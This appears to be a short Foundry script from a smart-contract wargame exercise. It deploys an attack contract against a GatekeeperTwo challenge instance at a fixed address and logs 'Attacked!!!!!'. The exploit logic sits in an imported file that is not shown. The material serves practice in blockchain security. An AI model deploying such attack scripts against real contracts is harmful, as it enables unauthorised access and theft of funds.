//SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;
import {Script, console} from "forge-std/Script.sol";
import {GatekeeperTwo} from "../src/GateKeeperTwo.sol";
import {AttackGateKeeperTwo} from "../src/AttackGateKeeperTwo.sol";

contract AttackScriptGKT is Script {
    AttackGateKeeperTwo attack;

    address public instance = 0x8CaCB500a9A9D455012a64137DC4d5d35e76f3d3;

    function run() external {
        vm.startBroadcast();
        attack = new AttackGateKeeperTwo(GatekeeperTwo(instance));
        console.log("Attacked!!!!!");
        vm.stopBroadcast();
    }
}
